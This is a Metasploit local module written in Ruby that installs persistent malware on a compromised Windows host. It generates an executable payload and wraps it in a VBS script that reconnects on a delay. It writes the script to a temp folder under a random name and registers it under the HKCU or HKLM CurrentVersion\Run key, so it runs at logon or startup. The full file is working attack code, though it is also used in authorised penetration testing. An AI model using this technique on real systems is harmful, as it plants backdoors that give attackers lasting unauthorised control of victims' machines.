##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Exploit::EXE
  include Msf::Exploit::Local::Persistence
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/windows/local/persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Persistent Registry Startup Payload Installer',
        'Description' => %q{
          This module will install a payload that is executed during boot.
          It will be executed either at user logon or system startup via the registry
          value in "CurrentVersion\Run" (depending on privilege and selected method).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'g0tmi1k' # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Targets' => [ [ 'Windows', {} ] ],
        'Arch' => [ARCH_X64, ARCH_X86],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2011-10-19',
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_config_getenv
              stdapi_sys_config_getuid
              stdapi_sys_config_sysinfo
            ]
          }
        },
        'References' => [
          [ 'URL', 'https://attack.mitre.org/techniques/T1547/001/' ],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptInt.new('DELAY',
                 [true, 'Delay (in seconds) for persistent payload to keep reconnecting back.', 10]),
      OptEnum.new('STARTUP',
                  [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM']]),
      OptString.new('VBS_NAME',
                    [false, 'The filename to use for the VBS persistent script on the target host (%RAND% by default).', nil]),
      OptString.new('EXE_NAME',
                    [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),
      OptString.new('REG_NAME',
                    [false, 'The name to call registry value for persistence on target host (%RAND% by default).', nil]),
      # WritableDir now
      # OptString.new('PATH',
      #              [false, 'Path to write payload (%TEMP% by default).', nil])
    ])

    register_advanced_options([
      OptBool.new('EXEC_AFTER',
                  [false, 'Execute persistent script after installing.', false])
    ])
  end

  def check
    path = datastore['WritableDir'] || session.sys.config.getenv('TEMP')
    return CheckCode::Safe("Path doesn't exists: #{path}") unless exists?(path)

    CheckCode::Appears
  end

  # Exploit method for when exploit command is issued
  def install_persistence
    # Define default values
    rvbs_name = datastore['VBS_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
    rexe_name = datastore['EXE_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
    reg_val = datastore['REG_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
    startup = datastore['STARTUP'].downcase
    delay = datastore['DELAY']
    exec_after = datastore['EXEC_AFTER']

    rvbs_name += '.vbs' if rvbs_name[-4, 4] != '.vbs'
    rexe_name += '.exe' if rexe_name[-4, 4] != '.exe'

    # Connect to the session
    begin
      print_status("Running persistent module against #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue StandardError => e
      print_error("Could not connect to session: #{e}")
      return nil
    end

    # Check values
    if is_system? && startup == 'user'
      print_warning('Note: Current user is SYSTEM & STARTUP == USER. This user may not login often!')
    end

    # Generate the exe payload
    vprint_status("Generating EXE payload (#{rexe_name})")
    exe = generate_payload_exe
    # Generate the vbs payload
    vprint_status("Generating VBS persistent script (#{rvbs_name})")
    vbsscript = ::Msf::Util::EXE.to_exe_vbs(exe, { persist: true, delay: delay, exe_filename: rexe_name })
    # Writing the payload to target
    vprint_status('Writing payload inside the VBS script on the target')
    script_on_target = write_script_to_target(vbsscript, rvbs_name)
    # Exit the module because we failed to write the file on the target host
    # Feedback has already been given to the user, via the function.
    return unless script_on_target

    # Initial execution of persistent script
    case startup
    when 'user'
      # If we could not write the entry in the registy we exit the module.
      return unless write_to_reg('HKCU', script_on_target, reg_val)

      vprint_status("Payload will execute when USER (#{session.sys.config.getuid}) next logs on")
    when 'system'
      # If we could not write the entry in the registy we exit the module.
      return unless write_to_reg('HKLM', script_on_target, reg_val)

      vprint_status('Payload will execute at the next SYSTEM startup')
    else
      print_error("Something went wrong. Invalid STARTUP method: #{startup}")
      return nil
    end

    # Do we execute the VBS script afterwards?
    target_exec(script_on_target) if exec_after
  end

  # Writes script to target host and returns the pathname of the target file or nil if the
  # file could not be written.
  def write_script_to_target(vbs, name)
    filename = name || Rex::Text.rand_text_alpha(rand(6..13)) + '.vbs'
    temppath = datastore['WritableDir'] || session.sys.config.getenv('TEMP')
    filepath = temppath + '\\' + filename

    unless directory?(temppath)
      print_error("#{temppath} does not exist on the target")
      return nil
    end

    if file?(filepath)
      print_warning("#{filepath} already exists on the target. Deleting...")
      begin
        file_rm(filepath)
        print_good("Deleted #{filepath}")
      rescue StandardError
        print_error('Unable to delete file!')
        return nil
      end
    end

    begin
      write_file(filepath, vbs)
      print_good("Persistent VBS script written on #{sysinfo['Computer']} to #{filepath}")

      # Escape windows pathname separators.
      @clean_up_rc << "rm #{filepath.gsub(/\\/, '//')}\n"
    rescue StandardError
      print_error('Could not write the payload on the target')
      # Return nil since we could not write the file on the target
      filepath = nil
    end

    filepath
  end

  # Installs payload in to the registry HKLM or HKCU
  def write_to_reg(key, script_on_target, registry_value)
    regsuccess = true
    nam = registry_value || Rex::Text.rand_text_alpha(rand(8..15))
    key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    print_status("Installing as #{key_path}\\#{nam}")

    if key && registry_setvaldata(key_path, nam, script_on_target, 'REG_SZ')
      print_good("Installed autorun on #{sysinfo['Computer']} as #{key_path}\\#{nam}")
    else
      print_error('Failed to make entry in the registry for persistence')
      regsuccess = false
    end

    regsuccess
  end

  # Executes script on target and returns true if it was successfully started
  def target_exec(script_on_target)
    execsuccess = true
    print_status("Executing script #{script_on_target}")
    # Lets give the target a few seconds to catch up...
    Rex.sleep(3)

    # Error handling for process.execute() can throw a RequestError in send_request.
    begin
      if datastore['EXE::Custom']
        cmd_exec("cscript \"#{script_on_target}\"")
      else
        cmd_exec("wscript \"#{script_on_target}\"")
      end
    rescue StandardError
      print_error('Failed to execute payload on target')
      execsuccess = false
    end

    execsuccess
  end
end
